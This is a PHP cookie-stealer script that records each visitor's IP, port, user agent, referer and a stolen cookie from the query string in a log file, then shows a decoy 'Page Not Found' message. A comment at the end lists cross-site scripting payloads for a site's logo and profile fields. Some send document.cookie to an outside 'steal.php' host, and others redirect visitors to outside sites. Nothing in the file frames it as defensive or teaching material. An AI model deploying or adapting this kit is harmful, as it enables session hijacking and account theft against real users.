
<?php 

function GetIP() 
{ 
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) 
		$ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 
		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) 
		$ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) 
		$ip = $_SERVER['REMOTE_ADDR']; 
	else 
		$ip = "unknown"; 
	return($ip); 
} 

function logData() 
{ 
	$ipLog="log.txt"; 
	$cookie = $_SERVER['QUERY_STRING']; 
	$register_globals = (bool) ini_get('register_gobals'); 
	if ($register_globals) $ip = getenv('REMOTE_ADDR'); 
	else $ip = GetIP(); 

	$rem_port = $_SERVER['REMOTE_PORT']; 
	$user_agent = $_SERVER['HTTP_USER_AGENT']; 
	$rqst_method = $_SERVER['METHOD']; 
	$rem_host = $_SERVER['REMOTE_HOST']; 
	$referer = $_SERVER['HTTP_REFERER']; 
	$date=date ("l dS of F Y h:i:s A"); 
	$log=fopen("$ipLog", "a+"); 

	if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog)) 
		fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE{ : } $date | COOKIE:  $cookie <br>"); 
	else 
		fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host |  Agent: $user_agent | METHOD: $rqst_method | REF: $referer |  DATE: $date | COOKIE:  $cookie \n\n"); 
	fclose($log); 
} 

logData(); 

echo '<b>Page Not Found</b>'

/*


"><script language= "javaScript">document.location="http://easymobad.com/steal.php?cookie=" + document.cookie;document.location="http://easymobad.com/steal.php"</script><" (on club logo)


"><a href="#" onclick="document.location='http://easymobad.com/steal.php?cookie=' +escape(document.cookie);"><Click Me></a></script>

"><b onmouseover="self.location.href='http://localhost/wapbies.com'"><" (on club logo)
"><body onload="location='http://localhost/wapbies.com/index.php'"><"   (on club logo)
"><script>document.write('<img src="http://localhost/wapbies.com/steal.php/'+document.cookie+'") </script><"

<b onclick="location.href='http://getmag.co.cc'">   (on profile)
<b onmouseover="location.href='http://lare.co.cc'">  (on profile)
<b onmouseover="location.href='http://lare.co.cc'"   (on profile)
<i onmouseover="location.href='http://lare.co.cc'"   (on profile)
<u onmouseover="location.href='http://lare.co.cc'"   (on profile)
<body onload="location='http://wapbies.com/index'"   (on profile)

*/



?>